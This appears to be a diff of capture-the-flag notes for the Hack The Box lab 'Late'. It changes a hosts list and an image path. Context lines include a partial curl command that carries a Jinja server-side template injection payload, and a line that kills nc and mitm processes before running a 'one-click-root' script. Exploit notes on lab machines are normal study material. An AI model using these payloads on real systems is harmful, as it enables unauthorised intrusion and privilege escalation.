@@ -4,8 +4,8 @@
 late.htb
 
 # hosts
-late.htb 
-image.late.htb # vuln for ssti
+- late.htb 
+- image.late.htb # vuln for ssti
 
 
 # special setting:
@@ -110,4 +110,4 @@ curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(
 kill -9 $(ps aux | grep -i mitm | awk '{print $2}'); pkill nc; ./one-click-root.py
 ```
 
-![](late.htb/ocr.gif)
+![](./ocr.gif)
